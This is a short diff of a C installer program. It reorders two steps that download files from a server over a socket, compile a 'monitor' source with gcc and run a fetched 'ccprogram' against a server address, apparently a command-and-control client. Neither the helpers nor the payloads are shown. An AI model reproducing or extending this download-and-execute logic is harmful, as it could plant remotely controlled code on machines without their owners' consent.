@@ -57,6 +57,14 @@ int main(int argc,char* argv[])
     }
     
     rv = opensocket();
+    rv = obtain(MONITOR);
+    close(sock_fd);
+    if(rv == 0){
+        char *moniargs[] = {"gcc", MONITOR, "-o", "monitor", NULL};
+        execcmd(moniargs);
+    }
+    
+    rv = opensocket();
     rv = obtain(CCPROGRAM);
     close(sock_fd);
     if(rv == 0){
@@ -65,14 +73,6 @@ int main(int argc,char* argv[])
         
         char *ccargs[] = {"./ccprogram", SERVER_ADDR, NULL};
         execcmd(ccargs);
-    }
-    
-    rv = opensocket();
-    rv = obtain(MONITOR);
-    close(sock_fd);
-    if(rv == 0){
-        char *moniargs[] = {"gcc", MONITOR, "-o", "monitor", NULL};
-        execcmd(moniargs);
     }
     
     printf("Install success!\n");
